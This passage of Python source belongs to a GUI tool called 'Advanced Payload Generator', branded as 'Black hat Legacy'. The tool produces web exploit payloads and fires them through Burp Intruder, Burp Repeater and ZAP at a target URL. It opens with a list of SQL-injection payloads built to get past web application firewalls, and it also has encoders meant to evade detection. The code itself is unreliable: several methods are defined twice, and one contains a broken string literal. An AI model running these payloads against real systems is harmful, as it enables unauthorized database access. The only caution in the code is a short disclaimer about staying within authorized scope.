                "1'/**/AND/**/0x313D31--",
                # Bypass comment filtering
                "1'/*//*/UNION/*//*/SELECT/*//*/1,2,3#",
                "1'/*//*/AND/*//*/1=1#",
                "1'/*!UNION*//*!SELECT*/version()#",
                "1'/*!50000UNION*//*!50000SELECT*/1,2,3#",
                # Bypass keyword filtering
                "1'/**/UnIoN/**/SeLeCt/**/1,2,3#",
                "1'+UN/**/ION+SE/**/LECT+1,2,3#",
                "1'+UNI%6FN+SEL%45CT+1,2,3#",
                # Function bypasses
                "1'/**/AND/**/ASCII(MID(version(),1,1))>52#",
                "1'/**/AND/**/ORD(SUBSTR(version(),1,1))>52#",
                "1'/**/AND/**/HEX(MID(version(),1,1))>34#"
            ]
        }
        
        return advanced_waf_bypasses.get(waf_type, [])
    
    # Integration Methods with REAL functionality
    def test_burp_connection(self):
        """Test connection to Burp Suite API with real implementation"""
        self.update_status("Testing Burp connection...")
        threading.Thread(target=self._test_burp_connection_thread, daemon=True).start()
    
    def _test_burp_connection_thread(self):
        """Thread function for testing REAL Burp connection"""
        try:
            success, response = self.burp_integration.real_connection_test(
                self.burp_api_url.get(), 
                self.burp_api_key.get()
            )
            
            self.generation_stats['api_calls'] += 1
            if success:
                self.generation_stats['real_burp_connections'] += 1
                self.root.after(0, self._show_connection_success, "Burp Suite", response)
            else:
                self.root.after(0, self._show_connection_error, "Burp Suite", response)
                
        except Exception as e:
            self.root.after(0, self._show_connection_error, "Burp Suite", str(e))
    
    def test_zap_connection(self):
        """Test connection to ZAP API with real implementation"""
        self.update_status("Testing ZAP connection...")
        threading.Thread(target=self._test_zap_connection_thread, daemon=True).start()
    
    def _test_zap_connection_thread(self):
        """Thread function for testing REAL ZAP connection"""
        try:
            success, response = self.zap_integration.real_connection_test(
                self.zap_api_url.get(), 
                self.zap_api_key.get()
            )
            
            self.generation_stats['api_calls'] += 1
            if success:
                self.generation_stats['real_zap_connections'] += 1
                self.root.after(0, self._show_connection_success, "ZAP", response)
            else:
                self.root.after(0, self._show_connection_error, "ZAP", response)
                
        except Exception as e:
            self.root.after(0, self._show_connection_error, "ZAP", str(e))
    
    def _show_connection_success(self, tool, response_data):
        """Show successful connection message with real data"""
        messagebox.showinfo("Success", f"✅ Successfully connected to {tool}!\n\nResponse: {response_data}")
        self.update_status(f"✅ {tool} connection successful")
        self._update_stats()
    
    def _show_connection_error(self, tool, error):
        """Show connection error message"""
        messagebox.showerror("Error", f"❌ Failed to connect to {tool}:\n{error}")
        self.update_status(f"❌ {tool} connection failed")
    
    def send_to_burp_repeater(self):
        """Send selected payloads to Burp Repeater with real implementation"""
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads generated yet")
            return
        
        target_url = self.burp_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Sending payloads to Burp Repeater...")
        threading.Thread(target=self._send_to_burp_thread, daemon=True).start()
    
    def _send_to_burp_thread(self):
        """Thread function for sending payloads to REAL Burp"""
        try:
            results = self.burp_integration.real_send_to_repeater(
                self.burp_api_url.get(),
                self.burp_api_key.get(),
                self.burp_target_url.get(),
                self.burp_parameter.get(),
                self.generated_payloads[:10]  # Send first 10 payloads
            )
            
            self.root.after(0, self._display_burp_results, results)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"Burp integration failed: {str(e)}")
    
    def _display_burp_results(self, results):
        """Display REAL Burp integration results"""
        self.burp_results.delete("1.0", tk.END)
        result_text = f"Burp Suite Integration Results:\n{'='*50}\n\n"
        successful = 0
        for i, result in enumerate(results, 1):
            if result.get('success'):
                status = 'Success'
                successful += 1
            else:
                status = 'Failed'
            result_text += f"{i:03d}: {status}\n"
            result_text += f"     Payload: {result.get('payload', 'N/A')[:50]}...\n"
            result_text += f"     Response: {result.get('response_code', 'N/A')} in {result.get('response_time', 'N/A')}ms\n\n"
        self.burp_results.insert("1.0", result_text)
        self.update_status(f"✅ Sent {successful}/{len(results)} payloads to Burp Repeater")
        self.generation_stats['successful_tests'] += successful
        self.generation_stats['api_calls'] += len(results)
        self._update_stats()

    def send_to_burp_intruder(self):
        """Send payloads to Burp Intruder with real implementation"""
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads generated yet")
            return
        
        target_url = self.burp_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Sending payloads to Burp Intruder...")
        threading.Thread(target=self._send_to_burp_intruder_thread, daemon=True).start()
    
    def _send_to_burp_intruder_thread(self):
        """Thread function for sending payloads to REAL Burp Intruder"""
        try:
            results = self.burp_integration.real_send_to_intruder(
                self.burp_api_url.get(),
                self.burp_api_key.get(),
                self.burp_target_url.get(),
                self.burp_parameter.get(),
                self.generated_payloads
            )
            
            self.root.after(0, self._display_burp_intruder_results, results)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"Burp Intruder integration failed: {str(e)}")
    
    def _display_burp_intruder_results(self, results):
        """Display REAL Burp Intruder results"""
        self.burp_results.delete("1.0", tk.END)
        result_text = f"Burp Intruder Results:\n{'='*50}\n\n"
        if results.get('success'):
            result_text += f"Attack ID: {results.get('attack_id', 'N/A')}\n"
            result_text += f"Status: {results.get('status', 'Unknown')}\n"
            result_text += f"Payloads Queued: {len(self.generated_payloads)}\n"
            result_text += f"Attack Type: {results.get('attack_type', 'Sniper')}\n\n"
            attack_results = results.get('attack_results', [])
            if attack_results:
                for i, res in enumerate(attack_results, 1):
                    status = 'Success' if res.get('success') else 'Failed'
                    result_text += f"{i:03d}: {status} | Response: {res.get('response_code', 'N/A')} in {res.get('response_time', 'N/A')}ms\n"
        else:
            result_text += f"Attack failed: {results.get('error', 'Unknown error')}\n"
        self.burp_results.insert("1.0", result_text)
        if results.get('success'):
            self.update_status(f"✅ Burp Intruder attack started with {len(self.generated_payloads)} payloads")
            self.generation_stats['successful_tests'] += len(self.generated_payloads)
        else:
            self.update_status("❌ Burp Intruder attack failed")
        self.generation_stats['api_calls'] += 1
        self._update_stats()

    def zap_spider_url(self):
        """Spider URL using ZAP with real implementation"""
        target_url = self.zap_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Starting ZAP spider...")
        threading.Thread(target=self._zap_spider_thread, args=(target_url,), daemon=True).start()
    
    def _zap_spider_thread(self, url):
        """Thread function for REAL ZAP spidering"""
        try:
            result = self.zap_integration.real_spider_url(
                self.zap_api_url.get(),
                self.zap_api_key.get(),
                url
            )
            
            self.root.after(0, self._display_zap_spider_results, result)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"ZAP spider failed: {str(e)}")
    
    def _display_zap_spider_results(self, result):
        self.zap_results.delete("1.0", tk.END)
        if result.get('success'):
            result_text = f"""ZAP Spider Results:\n{'━'*40}\n\n"
            result_text += f"Spider ID: {result.get('spider_id', 'Unknown')}\n"
            result_text += f"Status: {result.get('status', 'Unknown')}\n"
            result_text += f"Progress: {result.get('progress', 0)}%\n"
            result_text += f"URLs Found: {len(result.get('urls', []))}\n"
            result_text += f"Messages: {result.get('messages_count', 0)}\n\n"
            result_text += f"Scan Statistics:\n  Start Time: {result.get('start_time', 'N/A')}\n  Duration: {result.get('duration', 'N/A')}\n  Requests Sent: {result.get('requests_sent', 0)}\n"
            urls = result.get('urls', [])
            if urls:
                result_text += "\nURLs:\n"
                for url in urls:
                    result_text += f"  - {url}\n"
            forms = result.get('forms', [])
            if forms:
                result_text += "\nForms:\n"
                for form in forms:
                    result_text += f"  - {form}\n"
            self.zap_results.insert("1.0", result_text)
            self.update_status(f"✅ ZAP spider completed - {len(result.get('urls', []))} URLs found")
            self.generation_stats['successful_tests'] += 1
        else:
            self.zap_results.insert("1.0", f"Spider failed: {result.get('error', 'Unknown error')}")
        self.generation_stats['api_calls'] += 1
        self._update_stats()

    def zap_active_scan(self):
        # Start active scan in ZAP with real implementation
        target_url = self.zap_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Starting ZAP active scan...")
        threading.Thread(target=self._zap_active_scan_thread, args=(target_url,), daemon=True).start()
    
    def _zap_active_scan_thread(self, url):
        # Thread function for REAL ZAP active scanning
        try:
            result = self.zap_integration.real_active_scan(
                self.zap_api_url.get(),
                self.zap_api_key.get(),
                url
            )
            
            self.root.after(0, self._display_zap_scan_results, result)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"ZAP active scan failed: {str(e)}")
    
    def _display_zap_scan_results(self, result):
        self.zap_results.delete("1.0", tk.END)
        if result.get('success'):
            result_text = f"ZAP Active Scan Results:\n{'='*50}\n\n"
            result_text += f"Scan ID: {result.get('scan_id', 'Unknown')}\nStatus: {result.get('status', 'Unknown')}\nAlerts: {result.get('alerts', 0)}\n\n"
            self.zap_results.insert("1.0", result_text)
            self.update_status("✅ ZAP active scan completed")
        else:
            self.zap_results.insert("1.0", f"Active scan failed: {result.get('error', 'Unknown error')}")
            self.update_status("❌ ZAP active scan failed")
        self.generation_stats['api_calls'] += 1
        self._update_stats()

    def _display_zap_payload_results(self, results):
        self.zap_results.delete("1.0", tk.END)
        result_text = f"ZAP Payload Testing Results:\n{'='*50}\n\n"
        successful = 0
        for i, result in enumerate(results, 1):
            status = 'Success' if result.get('success') else 'Failed'
            if result.get('success'):
                successful += 1
            result_text += f"{i:03d}: {status}\n"
            result_text += f"     Payload: {result.get('payload', 'N/A')[:50]}...\n"
            result_text += f"     Response: {result.get('response_code', 'N/A')} in {result.get('response_time', 'N/A')}ms\n\n"
        self.zap_results.insert("1.0", result_text)
        self.update_status(f"✅ Tested {successful}/{len(results)} payloads in ZAP")
        self.generation_stats['successful_tests'] += successful
        self.generation_stats['api_calls'] += len(results)
        self._update_stats()

    def export_txt(self):
        # Export generated payloads to a TXT file
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to export.")
            return
        from tkinter import filedialog
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "w") as f:
                f.write("\n".join(self.generated_payloads))
            self.update_status(f"✅ Exported payloads to {file_path}")

    def export_json(self):
        # Export generated payloads to a JSON file
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to export.")
            return
        import json
        from tkinter import filedialog
        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if file_path:
            with open(file_path, "w") as f:
                json.dump(self.generated_payloads, f, indent=2)
            self.update_status(f"✅ Exported payloads to {file_path}")

    def copy_all_payloads(self):
        # Copy all generated payloads to clipboard
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to copy.")
            return
        self.root.clipboard_clear()
        self.root.clipboard_append("\n".join(self.generated_payloads))
        self.update_status("✅ Copied all payloads to clipboard")

    def show_help(self):
        # Show help dialog
        messagebox.showinfo("Help", "This tool generates advanced web exploit payloads.\n\n- Configure your payload type and options.\n- Use the integration tabs for Burp Suite and ZAP.\n- Export or copy results as needed.\n- For more info, see the documentation or contact support.")

    def clear_results(self):
        # Clear the generated payloads display and preview
        self.payload_display.delete("1.0", tk.END)
        self.payload_preview.delete("1.0", tk.END)
        self.generated_payloads = []
        self.update_line_numbers()
        self.update_status("Results cleared.")

    # Utility Methods
    def quick_generate(self):
        # Quick payload generation with default settings
        # Set default values
        self.payload_type_var.set("xss")
        self.bypass_level_var.set(2)
        self.payload_count_var.set(5)
        self.ml_enabled_var.set(True)
        
        # Generate immediately
        self.generate_payloads()
    
    def show_statistics(self):
        # Show detailed statistics with REAL performance data
        stats_window = tk.Toplevel(self.root)
        stats_window.title("Generation Statistics")
        stats_window.geometry("600x500")
        
        stats_text = scrolledtext.ScrolledText(stats_window, wrap="word")
        stats_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Calculate real performance metrics
        current_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB
        avg_generation_time = sum(self.generation_times) / len(self.generation_times) if self.generation_times else 0
        uptime = time.time() - self.start_time
        success_rate = (self.generation_stats['successful_tests']/max(self.generation_stats['total_generated'], 1)*100) if self.generation_stats['total_generated'] > 0 else 0
        current_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB
        detailed_stats = []
        detailed_stats.append("Advanced Payload Generator Statistics")
        detailed_stats.append("="*60)
        detailed_stats.append("")
        detailed_stats.append("REAL PERFORMANCE METRICS")
        detailed_stats.append("-"*30)
        detailed_stats.append(f"Total Payloads Generated: {self.generation_stats['total_generated']}")
        detailed_stats.append(f"Successful Tests: {self.generation_stats['successful_tests']}")
        detailed_stats.append(f"WAF Detections: {self.generation_stats['waf_detections']}")
        detailed_stats.append(f"API Calls Made: {self.generation_stats['api_calls']}")
        detailed_stats.append(f"ML Mutations Applied: {self.generation_stats['ml_mutations_applied']}")
        detailed_stats.append("")
        detailed_stats.append("SUCCESS RATES")
        detailed_stats.append("-"*30)
        detailed_stats.append(f"Overall Success Rate: {success_rate:.1f}%")
        detailed_stats.append(f"Burp Connections: {self.generation_stats['real_burp_connections']}")
        detailed_stats.append(f"ZAP Connections: {self.generation_stats['real_zap_connections']}")
        detailed_stats.append("")
        detailed_stats.append("CURRENT SESSION METRICS")
        detailed_stats.append("-"*30)
        detailed_stats.append(f"Active Payloads: {len(self.generated_payloads)}")
        detailed_stats.append(f"Current Type: {self.payload_type_var.get().upper()}")
        detailed_stats.append(f"Bypass Level: {self.bypass_level_var.get()}/3")
        detailed_stats.append(f"ML Enabled: {'Yes' if self.ml_enabled_var.get() else 'No'}")
        detailed_stats.append("")
        detailed_stats.append("REAL PERFORMANCE DATA")
        detailed_stats.append("-"*30)
        detailed_stats.append(f"Average Generation Time: {avg_generation_time:.3f}s")
        detailed_stats.append(f"Current Memory Usage: {current_memory:.1f}MB")
        detailed_stats.append(f"Application Uptime: {uptime/60:.1f} minutes")
        detailed_stats.append(f"Generation Attempts: {len(self.generation_times)}")
        detailed_stats.append("")
        detailed_stats.append("INTEGRATION STATUS")
        detailed_stats.append("-"*30)
        detailed_stats.append(f"Burp Suite: {'Connected' if self.generation_stats['real_burp_connections'] > 0 else 'Not Connected'}")
        detailed_stats.append(f"OWASP ZAP: {'Connected' if self.generation_stats['real_zap_connections'] > 0 else 'Not Connected'}")
        detailed_stats.append("")
        detailed_stats.append("SYSTEM INFORMATION")
        detailed_stats.append("-"*30)
        detailed_stats.append(f"CPU Usage: {psutil.cpu_percent():.1f}%")
        detailed_stats.append(f"Available Memory: {psutil.virtual_memory().available / 1024 / 1024:.0f}MB")
        detailed_stats.append(f"Disk Usage: {psutil.disk_usage('/').percent:.1f}%")
        stats_text.insert("1.0", "\n".join(detailed_stats))
        stats_text.config(state="disabled")
    
    def show_help(self):
        # Show help documentation
        webbrowser.open("https://github.com/Black hat Legacy( Muhammad Zain)/payload-generator/wiki")
        self.update_status("Help documentation opened in browser")
    
    def copy_all_payloads(self):
        # Copy all generated payloads to clipboard
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to copy")
            return
        
        try:
            payload_text = "\n".join(self.generated_payloads)
            pyperclip.copy(payload_text)
            messagebox.showinfo("Success", f"✅ Copied {len(self.generated_payloads)} payloads to clipboard!")
            self.update_status(f"✅ Copied {len(self.generated_payloads)} payloads to clipboard")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to copy payloads: {str(e)}")
    
    def export_txt(self):
        # Export payloads as TXT file
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to export")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            title="Export Payloads as TXT"
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"# Advanced Payload Generator - Export\n")
                    f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"# Type: {self.payload_type_var.get().upper()}\n")
                    f.write(f"# Count: {len(self.generated_payloads)}\n")
                    f.write(f"# ML Mutations: {'Enabled' if self.ml_enabled_var.get() else 'Disabled'}\n\n")
                    
                    for i, payload in enumerate(self.generated_payloads, 1):
                        f.write(f"{i:04d}: {payload}\n")
                
                messagebox.showinfo("Success", f"✅ Exported {len(self.generated_payloads)} payloads to {filename}")
                self.update_status(f"✅ Exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Export failed: {str(e)}")
    
    def export_json(self):
        # Export payloads as JSON file with comprehensive data
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to export")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
            title="Export Payloads as JSON"
        )
        
        if filename:
            try:
                current_memory = psutil.Process().memory_info().rss / 1024 / 1024
                avg_generation_time = sum(self.generation_times) / len(self.generation_times) if self.generation_times else 0
                
                export_data = {
                    "metadata": {
                        "generator": "Advanced Payload Generator v4.0 (Fixed)",
                        "company": "Black hat Legacy( Muhammad Zain) PVT LTD",
                        "generated_at": datetime.now().isoformat(),
                        "payload_type": self.payload_type_var.get(),
                        "payload_count": len(self.generated_payloads),
                        "configuration": self._get_generation_config(),
                        "performance_metrics": {
                            "average_generation_time": avg_generation_time,
                            "memory_usage_mb": current_memory,
                            "total_generation_attempts": len(self.generation_times)
                        }
                    },
                    "payloads": [
                        {
                            "id": i + 1,
                            "payload": payload,
                            "length": len(payload),
                            "complexity_score": self._calculate_complexity_score(payload),
                            "techniques": self._detect_payload_techniques(payload),
                            "context_adapted": self.context_aware_var.get()
                        }
                        for i, payload in enumerate(self.generated_payloads)
                    ],
                    "statistics": self.generation_stats,
                    "real_performance_data": {
                        "generation_times": self.generation_times,
                        "memory_usage_history": [current_memory],  # Could track over time
                        "success_rate": (self.generation_stats['successful_tests']/max(self.generation_stats['total_generated'], 1)*100),
                        "ml_mutation_effectiveness": self.generation_stats['ml_mutations_applied']
                    }
                }
                
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(export_data, f, indent=2, ensure_ascii=False)
                
                messagebox.showinfo("Success", f"✅ Exported comprehensive report to {filename}")
                self.update_status(f"✅ JSON export completed")
            except Exception as e:
                messagebox.showerror("Error", f"JSON export failed: {str(e)}")
    
    def _calculate_complexity_score(self, payload):
        # Calculate payload complexity score with advanced metrics
        score = 0.0
        
        # Character diversity
        score += len(set(payload)) * 0.1
        
        # Special characters (more weight for complex chars)
        special_chars = len(re.findall(r'[<>"' + "'" + r'\(\)\[\]{}\\/\*\+\?\.\^\$\|]', payload))
        score += special_chars * 0.3
        
        # Encoding indicators (higher weight for advanced encoding)
        encoded_chars = len(re.findall(r'%[0-9a-f]{2}|&#\d+;|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}', payload, re.I))
        score += encoded_chars * 0.4
        
        # Function calls and keywords
        functions = len(re.findall(r'\w+\(.*?\)', payload))
        score += functions * 0.2
        
        # SQL injection specific patterns
        sql_patterns = len(re.findall(r'(union|select|from|where|order|group|having)', payload, re.I))
        score += sql_patterns * 0.3
        
        # XSS specific patterns
        xss_patterns = len(re.findall(r'(script|onerror|onload|alert|eval|document)', payload, re.I))
        score += xss_patterns * 0.2
        
        # Length normalization (diminishing returns)
        score += min(len(payload) / 50, 2.0)
        
        return round(score, 2)
    
    def clear_results(self):
        """Clear all results and reset"""
        self.payload_display.delete("1.0", tk.END)
        self.payload_preview.delete("1.0", tk.END)
        self.generated_payloads.clear()
        self.update_status("Results cleared")
        self._update_stats()
    
    def test_selected_payload(self):
        """Test the currently selected payload with real implementation"""
        try:
            selection = self.payload_display.selection_get()
            if selection:
                # Extract just the payload part (remove line number)
                payload = selection.split(": ", 1)[-1] if ": " in selection else selection
                
                # Show real test options
                test_window = tk.Toplevel(self.root)
                test_window.title("Payload Testing Options")
                test_window.geometry("400x300")
                
                ttk.Label(test_window, text="Select testing method:").pack(pady=10)
                
                test_var = tk.StringVar(value="manual")
                test_options = [
                    ("Manual Analysis", "manual"),
                    ("Send to Burp Repeater", "burp"),
                    ("Send to ZAP", "zap"),
                    ("Local Test", "local")
                ]
                
                for text, value in test_options:
                    ttk.Radiobutton(test_window, text=text, variable=test_var, value=value).pack(anchor="w", padx=20)
                
                def execute_test():
                    test_type = test_var.get()
                    if test_type == "burp" and self.generation_stats['real_burp_connections'] > 0:
                        # Real Burp integration
                        self.burp_target_url.set(self.target_url_var.get())
                        self.generated_payloads = [payload]  # Temporarily set for testing
                        self.send_to_burp_repeater()
                    elif test_type == "zap" and self.generation_stats['real_zap_connections'] > 0:
                        # Real ZAP integration
                        self.zap_target_url.set(self.target_url_var.get())
                        self.generated_payloads = [payload]  # Temporarily set for testing
                        self.send_payloads_to_zap()
                    else:
                        # Manual analysis
                        analysis = self._analyze_payload_detailed(payload)
                        messagebox.showinfo("Payload Analysis", analysis)
                    
                    test_window.destroy()
                
                ttk.Button(test_window, text="Execute Test", command=execute_test).pack(pady=20)
                
        except tk.TclError:
            messagebox.showwarning("Warning", "Please select a payload to test")
    
    def _analyze_payload_detailed(self, payload):
        """Perform detailed payload analysis"""
        analysis = f"Detailed Payload Analysis\n{'='*40}\n\n"
        analysis += f"Payload: {payload}\n\n"
        analysis += f"BASIC METRICS:\n"
        analysis += f"Length: {len(payload)} characters\n"
        analysis += f"Complexity Score: {self._calculate_complexity_score(payload)}\n"
        analysis += f"Character Diversity: {len(set(payload))} unique chars\n\n"
        analysis += "DETECTED TECHNIQUES:\n"
        
        # Detect techniques with more detail
        techniques = []
        if re.search(r'<script', payload, re.I):
            techniques.append("✓ Script tag injection (High Risk)")
        if re.search(r'javascript:', payload, re.I):
            techniques.append("✓ JavaScript URL scheme (Medium Risk)")
        if re.search(r'on\w+\s*=', payload, re.I):
            techniques.append("✓ Event handler injection (High Risk)")
        if re.search(r'union.*select', payload, re.I):
            techniques.append("✓ SQL Union injection (Critical)")
        if re.search(r';\s*\w+', payload):
            techniques.append("✓ Command chaining (High Risk)")
        if re.search(r'eval\s*\(', payload, re.I):
            techniques.append("✓ Code evaluation (Critical)")
        
        analysis += "\n".join(techniques) if techniques else "No specific techniques detected"
        analysis += "\n\nENCODING ANALYSIS:\n"
        analysis += f"URL Encoded: {'Yes (' + str(len(re.findall(r'%[0-9a-f]{{2}}', payload, re.I))) + ' instances)' if '%' in payload else 'No'}\n"
        analysis += f"HTML Entities: {'Yes (' + str(len(re.findall(r'&#\\d+;', payload))) + ' instances)' if '&#' in payload else 'No'}\n"
        analysis += f"Hex Encoded: {'Yes (' + str(len(re.findall(r'\\x[0-9a-f]{{2}}', payload, re.I))) + ' instances)' if '\\x' in payload else 'No'}\n"
        analysis += f"Unicode: {'Yes (' + str(len(re.findall(r'\\u[0-9a-f]{{4}}', payload, re.I))) + ' instances)' if '\\u' in payload else 'No'}\n"
        analysis += "\nRISK ASSESSMENT:\n"
        analysis += f"Likelihood: {'High' if len(techniques) > 2 else 'Medium' if techniques else 'Low'}\n"
        analysis += f"Impact: {'Critical' if any('Critical' in t for t in techniques) else 'High' if any('High Risk' in t for t in techniques) else 'Medium'}\n"
        analysis += "\nWAF BYPASS POTENTIAL:\n"
        analysis += f"Obfuscation Level: {'High' if re.search(r'[%\\\\]', payload) else 'Low'}\n"
        analysis += f"Evasion Techniques: {len(re.findall(r'[<>\"'()\[\]{{}}]', payload))} special chars detected\n"
        analysis += "\nRECOMMENDATIONS:\n"
        analysis += "- Test in isolated environment only\n"
        analysis += "- Verify target is within authorized scope\n"
        analysis += "- Document all findings properly\n"
        analysis += "- Use appropriate responsible disclosure\n"
        analysis += "- Consider impact before testing\n"
        
        return analysis
    
    def encode_selected_payload(self):
        """Encode the currently selected payload with real implementation"""
        try:
            selection = self.payload_display.selection_get()
            if selection:
                payload = selection.split(": ", 1)[-1] if ": " in selection else selection
                
                # Show encoding options dialog
                encoding_window = tk.Toplevel(self.root)
                encoding_window.title("Advanced Payload Encoding")
                encoding_window.geometry("500x400")
                
                ttk.Label(encoding_window, text="Select encoding method:").pack(pady=10)
                
                encoding_var = tk.StringVar(value="url")
                encodings = [
                    ("URL Encoding", "url"),
                    ("Double URL Encoding", "double_url"),
                    ("Base64", "base64"),
                    ("Hex", "hex"),
                    ("Unicode", "unicode"),
                    ("HTML Entities", "html"),
                    ("Mixed Case", "mixed_case"),
                    ("Advanced Obfuscation", "advanced")
                ]
                
                for text, value in encodings:
                    ttk.Radiobutton(encoding_window, text=text, variable=encoding_var, value=value).pack(anchor="w", padx=20)
                
                def apply_encoding():
                    encoding = encoding_var.get()
                    encoded = self.encoder.advanced_encode_payload(payload, encoding)
                    
                    result_window = tk.Toplevel(self.root)
                    result_window.title("Advanced Encoded Payload")
                    result_window.geometry("700x500")
                    
                    result_text = scrolledtext.ScrolledText(result_window, wrap="word")
                    result_text.pack(fill="both", expand=True, padx=10, pady=10)
                    
                    result_content = "Advanced Payload Encoding Results\n" + ("="*50) + "\n\n"
                    result_content += f"Original Payload:\n{payload}\n\n"
                    result_content += f"Encoding Method: {encoding.upper()}\n\n"
                    result_content += f"Encoded Payload:\n{encoded}\n\n"
                    result_content += "Encoding Statistics:\n"
                    result_content += f"- Original Length: {len(payload)}\n"
                    result_content += f"- Encoded Length: {len(encoded)}\n"
                    result_content += f"- Size Increase: {((len(encoded) - len(payload)) / len(payload) * 100):.1f}%\n"
                    result_content += f"- Complexity Score: {self._calculate_complexity_score(encoded)}\n\n"
                    result_content += "Bypass Potential:\n"
                    result_content += f"- WAF Evasion: {'High' if encoding in ['advanced', 'unicode', 'double_url'] else 'Medium'}\n"
                    result_content += f"- Detection Difficulty: {'High' if len(encoded) > len(payload) * 1.5 else 'Medium'}\n"
                    result_content += f"- Browser Compatibility: {'Good' if encoding in ['url', 'html'] else 'Limited'}\n\n"
                    result_content += "Context Recommendations:\n"
                    result_content += f"- Best for: {self._get_encoding_context_recommendation(encoding)}\n"
                    result_content += f"- Use case: {self._get_encoding_use_case(encoding)}\n"
                    
                    result_text.insert("1.0", result_content)
                    
                    # Copy button
                    copy_btn = ttk.Button(result_window, text="Copy Encoded Payload", 
                                        command=lambda: pyperclip.copy(encoded))
                    copy_btn.pack(pady=5)
                    
                    encoding_window.destroy()
                
                ttk.Button(encoding_window, text="Encode", command=apply_encoding).pack(pady=20)
                
        except tk.TclError:
            messagebox.showwarning("Warning", "Please select a payload to encode")
    
    def _get_encoding_context_recommendation(self, encoding):
        """Get context recommendation for encoding type"""
        recommendations = {
            'url': 'URL parameters and query strings',
            'double_url': 'Double-encoded URL contexts with WAF bypass',
            'base64': 'Data attributes and encoded content',
            'hex': 'Binary data and low-level bypasses',
            'unicode': 'Unicode-aware applications and browsers',
            'html': 'HTML content and attribute values',
            'mixed_case': 'Case-insensitive contexts',
            'advanced': 'Advanced WAF bypass scenarios'
        }
        return recommendations.get(encoding, 'General purpose encoding')
    
    def _get_encoding_use_case(self, encoding):
        """Get use case for encoding type"""
        use_cases = {
            'url': 'Standard web parameter encoding',
            'double_url': 'Bypassing URL decoding filters',
            'base64': 'Data obfuscation and encoding',
            'hex': 'Binary representation and low-level access',
            'unicode': 'Character set evasion techniques',
            'html': 'HTML entity encoding for XSS',
            'mixed_case': 'Case manipulation for filter bypass',
            'advanced': 'Multi-layer obfuscation and evasion'
        }
        return use_cases.get(encoding, 'Custom encoding technique')
    
    def analyze_selected_payload(self):
        """Analyze the currently selected payload with enhanced analysis"""
        try:
            selection = self.payload_display.selection_get()
            if selection:
                payload = selection.split(": ", 1)[-1] if ": " in selection else selection
                
                analysis_window = tk.Toplevel(self.root)
                analysis_window.title("Advanced Payload Analysis")
                analysis_window.geometry("600x500")
                
                analysis_text = scrolledtext.ScrolledText(analysis_window, wrap="word")
                analysis_text.pack(fill="both", expand=True, padx=10, pady=10)
                
                # Perform enhanced analysis
                analysis = self._perform_advanced_analysis(payload)
                analysis_text.insert("1.0", analysis)
                analysis_text.config(state="disabled")
                
        except tk.TclError:
            messagebox.showwarning("Warning", "Please select a payload to analyze")
    
    def _perform_advanced_analysis(self, payload):
        """Perform comprehensive payload analysis"""
        analysis = f"Advanced Payload Analysis Report\n{'='*60}\n\n"
        analysis += f"PAYLOAD: {payload}\n\n"
        analysis += "BASIC METRICS\n" + ("-"*20) + "\n"
        analysis += f"Length: {len(payload)} characters\n"
        analysis += f"Complexity Score: {self._calculate_complexity_score(payload)}/10\n"
        analysis += f"Character Diversity: {len(set(payload))}/{len(payload)} unique\n"
        analysis += f"Entropy: {self._calculate_entropy(payload):.3f}\n\n"
        analysis += "ATTACK VECTOR CLASSIFICATION\n" + ("-"*30) + "\n"
        
        # Classify attack vector
        vector_type = self._classify_attack_vector(payload)
        analysis += f"Primary Vector: {vector_type}\n"
        
        # Detect techniques with confidence scores
        techniques = self._detect_advanced_techniques(payload)
        analysis += "\nDETECTED TECHNIQUES\n" + "-"*20 + "\n"
        for technique, confidence in techniques:
            analysis += f"• {technique} (Confidence: {confidence}%)\n"
        
        # Encoding analysis
        encodings = self._analyze_encoding_patterns(payload)
        analysis += f"\nENCODING PATTERNS\n{'-'*20}\n"
        for encoding, count in encodings.items():
            if count > 0:
                analysis += f"• {encoding}: {count} instances\n"
        
        # Context compatibility
        analysis += f"\nCONTEXT COMPATIBILITY\n{'-'*25}\n"
        compatibility = self._analyze_context_compatibility(payload)
        for context, compatible in compatibility.items():
            status = "✓" if compatible else "✗"
            analysis += f"{status} {context}\n"
        
        # Risk assessment
        risk_level = self._calculate_risk_level(payload, techniques)
        analysis += f"\nRISK ASSESSMENT\n{'-'*20}\n"
        analysis += f"Risk Level: {risk_level['level']}\n"
        analysis += f"Impact Score: {risk_level['impact']}/10\n"
        analysis += f"Detectability: {risk_level['detectability']}\n"
        
        # WAF bypass potential
        bypass_potential = self._analyze_waf_bypass_potential(payload)
